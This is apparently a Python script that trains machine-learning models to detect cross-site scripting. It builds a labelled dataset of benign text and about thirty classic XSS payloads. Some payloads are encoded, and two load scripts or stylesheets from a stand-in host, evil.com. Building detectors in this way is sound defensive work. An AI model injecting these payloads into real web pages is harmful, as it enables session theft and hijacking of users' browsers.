from sql_injection_detector import XSSDetector
import pandas as pd
import numpy as np
from sklearn.model_selection import train_test_split
import os

def create_synthetic_xss_dataset():
    """Create synthetic XSS dataset"""
    
    # Normal inputs
    normal_inputs = [
        "Hello world",
        "user@example.com",
        "Search for products",
        "My name is John Doe",
        "Product description",
        "Contact information",
        "About our company",
        "News and updates",
        "Customer feedback",
        "Price: $99.99",
        "Available in stock",
        "Free shipping",
        "24/7 customer support",
        "Privacy policy",
        "Terms of service"
    ] * 40
    
    # XSS attacks
    xss_attacks = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "javascript:alert('XSS')",
        "<script src=//evil.com/xss.js></script>",
        "<link rel=stylesheet href=//evil.com/xss.css>",
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
        "<form><button formaction=javascript:alert('XSS')>Click",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
    ] * 20
    
    # Create DataFrame
    data = []
    
    # Add normal inputs
    for input_text in normal_inputs:
        data.append({'input': input_text, 'label': 0})
    
    # Add XSS attacks
    for attack in xss_attacks:
        data.append({'input': attack, 'label': 1})
    
    return pd.DataFrame(data)

def load_kaggle_xss_dataset():
    """Load Kaggle XSS dataset if available"""
    dataset_path = 'datasets/web_security/XSS_dataset.csv'
    
    if os.path.exists(dataset_path):
        try:
            df = pd.read_csv(dataset_path)
            # Standardize column names
            if 'Sentence' in df.columns and 'Label' in df.columns:
                df = df.rename(columns={'Sentence': 'input', 'Label': 'label'})
            elif 'Data' in df.columns and 'Label' in df.columns:
                df = df.rename(columns={'Data': 'input', 'Label': 'label'})
            
            return df
        except Exception as e:
            print(f"Error loading Kaggle dataset: {e}")
            return create_synthetic_xss_dataset()
    else:
        print("Kaggle XSS dataset not found. Using synthetic data.")
        return create_synthetic_xss_dataset()

def main():
    print("Training XSS Detection Models")
    print("=" * 50)
    
    # Initialize detector
    detector = XSSDetector()
    
    # Load dataset
    print("Loading dataset...")
    df = load_kaggle_xss_dataset()
    
    print(f"Dataset shape: {df.shape}")
    print(f"Label distribution:\n{df['label'].value_counts()}")
    
    # Prepare data
    X = df['input'].values
    y = df['label'].values
    
    # Split data
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )
    
    print(f"Training set: {len(X_train)} samples")
    print(f"Test set: {len(X_test)} samples")
    
    # Train models
    print("\nTraining machine learning models...")
    results = detector.train_ml_models(X_train, X_test, y_train, y_test)
    
    # Save models
    model_dir = 'backend/models/web_security'
    os.makedirs(model_dir, exist_ok=True)
    
    print(f"\nSaving models to {model_dir}...")
    detector.save_models(model_dir)
    
    print("\nTraining completed successfully!")
    print("Model accuracies:")
    for model_name, result in results.items():
        print(f"  {model_name}: {result['accuracy']:.4f}")

if __name__ == "__main__":
    main()